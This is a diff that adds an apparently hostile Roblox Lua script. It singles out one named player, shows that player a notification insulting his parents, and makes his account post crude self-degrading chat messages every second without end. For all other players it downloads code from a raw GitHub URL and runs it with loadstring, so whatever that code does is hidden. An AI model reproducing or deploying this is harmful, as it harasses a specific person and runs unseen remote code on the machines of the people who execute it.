@@ -1,1 +1,45 @@
 
+local StarterGui = game:GetService("StarterGui")
+local Players = game:GetService("Players")
+local WhitelistedPlayers = {
+    ["cjh110827"] = true,
+}
+
+local function IsWhitelisted(player)
+    return WhitelistedPlayers[player.Name] or false
+end
+
+local localPlayer = Players.LocalPlayer
+
+local isLocalPlayerWhitelisted = IsWhitelisted(localPlayer)
+
+if isLocalPlayerWhitelisted then
+    StarterGui:SetCore("SendNotification", {
+        Title = "sb",
+        Text = "玩家:"..localPlayer.Name.."，死爹烂妈",
+        Duration = 7,
+    })
+    
+    -- 白名单玩家执行的无限循环发送聊天消息代码
+    local TextChatService = game:GetService("TextChatService")
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+    local function SendChatMessage(message)
+        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+            local textChannel = TextChatService.TextChannels.RBXGeneral
+            textChannel:SendAsync(message)
+        else
+            ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
+        end
+    end
+
+    -- 无限循环，每秒发送一次消息
+    while true do
+        SendChatMessage("我喜歡吃大便")
+        SendChatMessage("我是屌毛")
+        task.wait(1) 
+    end
+else
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/kismiletest/-/refs/heads/main/mfy"))()
+end
+
